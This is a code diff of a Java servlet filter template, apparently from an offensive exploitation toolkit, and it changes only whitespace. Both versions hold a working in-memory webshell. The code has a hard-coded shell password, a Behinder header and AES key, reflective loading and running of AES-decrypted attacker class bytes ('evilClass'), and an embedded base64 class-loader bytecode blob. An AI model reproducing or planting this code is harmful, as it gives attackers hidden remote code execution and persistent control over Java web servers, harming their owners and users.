@@ -14,10 +14,10 @@ import java.util.Scanner;
 
 public class DynamicFilterTemplate implements Filter {
 
-    private Class  myClassLoaderClazz;
-    private String basicCmdShellPwd    = "pass";
+    private Class myClassLoaderClazz;
+    private String basicCmdShellPwd = "pass";
     private String behinderShellHeader = "X-Options-Ai";
-    private String behinderShellPwd    = "e45e329feb5d925b"; // rebeyond
+    private String behinderShellPwd = "e45e329feb5d925b"; // rebeyond
 
     public DynamicFilterTemplate() {
         super();
@@ -55,9 +55,9 @@ public class DynamicFilterTemplate implements Filter {
                     Cipher cipher = Cipher.getInstance("AES");
                     cipher.init(2, new SecretKeySpec((((HttpServletRequest) servletRequest).getSession().getAttribute("u") + "").getBytes(), "AES"));
                     byte[] evilClassBytes = cipher.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(servletRequest.getReader().readLine()));
-                    Class  evilClass      = (Class) myClassLoaderClazz.getDeclaredMethod("defineClass", byte[].class, ClassLoader.class).invoke(null, evilClassBytes, Thread.currentThread().getContextClassLoader());
-                    Object evilObject     = evilClass.newInstance();
-                    Method targetMethod   = evilClass.getDeclaredMethod("equals", new Class[]{ServletRequest.class, ServletResponse.class});
+                    Class evilClass = (Class) myClassLoaderClazz.getDeclaredMethod("defineClass", byte[].class, ClassLoader.class).invoke(null, evilClassBytes, Thread.currentThread().getContextClassLoader());
+                    Object evilObject = evilClass.newInstance();
+                    Method targetMethod = evilClass.getDeclaredMethod("equals", new Class[]{ServletRequest.class, ServletResponse.class});
                     targetMethod.invoke(evilObject, new Object[]{servletRequest, servletResponse});
                 }
             } catch (Exception e) {
@@ -79,8 +79,8 @@ public class DynamicFilterTemplate implements Filter {
             try {
                 this.myClassLoaderClazz = classLoader.loadClass("com.qi4l.JYso.template.MyClassLoader");
             } catch (ClassNotFoundException e) {
-                String code   = "yv66vgAAADIAGwoABQAWBwAXCgACABYKAAIAGAcAGQEABjxpbml0PgEAGihMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAClMY29tL2ZlaWhvbmcvbGRhcC90ZW1wbGF0ZS9NeUNsYXNzTG9hZGVyOwEAAWMBABdMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAC2RlZmluZUNsYXNzAQAsKFtCTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspTGphdmEvbGFuZy9DbGFzczsBAAVieXRlcwEAAltCAQALY2xhc3NMb2FkZXIBAApTb3VyY2VGaWxlAQASTXlDbGFzc0xvYWRlci5qYXZhDAAGAAcBACdjb20vZmVpaG9uZy9sZGFwL3RlbXBsYXRlL015Q2xhc3NMb2FkZXIMAA8AGgEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAFyhbQklJKUxqYXZhL2xhbmcvQ2xhc3M7ACEAAgAFAAAAAAACAAAABgAHAAEACAAAADoAAgACAAAABiortwABsQAAAAIACQAAAAYAAQAAAAQACgAAABYAAgAAAAYACwAMAAAAAAAGAA0ADgABAAkADwAQAAEACAAAAEQABAACAAAAELsAAlkrtwADKgMqvrYABLAAAAACAAkAAAAGAAEAAAAIAAoAAAAWAAIAAAAQABEAEgAAAAAAEAATAA4AAQABABQAAAACABU=";
-                byte[] bytes  = new BASE64Decoder().decodeBuffer(code);
+                String code = "yv66vgAAADIAGwoABQAWBwAXCgACABYKAAIAGAcAGQEABjxpbml0PgEAGihMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAClMY29tL2ZlaWhvbmcvbGRhcC90ZW1wbGF0ZS9NeUNsYXNzTG9hZGVyOwEAAWMBABdMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAC2RlZmluZUNsYXNzAQAsKFtCTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspTGphdmEvbGFuZy9DbGFzczsBAAVieXRlcwEAAltCAQALY2xhc3NMb2FkZXIBAApTb3VyY2VGaWxlAQASTXlDbGFzc0xvYWRlci5qYXZhDAAGAAcBACdjb20vZmVpaG9uZy9sZGFwL3RlbXBsYXRlL015Q2xhc3NMb2FkZXIMAA8AGgEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAFyhbQklJKUxqYXZhL2xhbmcvQ2xhc3M7ACEAAgAFAAAAAAACAAAABgAHAAEACAAAADoAAgACAAAABiortwABsQAAAAIACQAAAAYAAQAAAAQACgAAABYAAgAAAAYACwAMAAAAAAAGAA0ADgABAAkADwAQAAEACAAAAEQABAACAAAAELsAAlkrtwADKgMqvrYABLAAAAACAAkAAAAGAAEAAAAIAAoAAAAWAAIAAAAQABEAEgAAAAAAEAATAA4AAQABABQAAAACABU=";
+                byte[] bytes = new BASE64Decoder().decodeBuffer(code);
                 Method method = null;
                 try {
                     method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
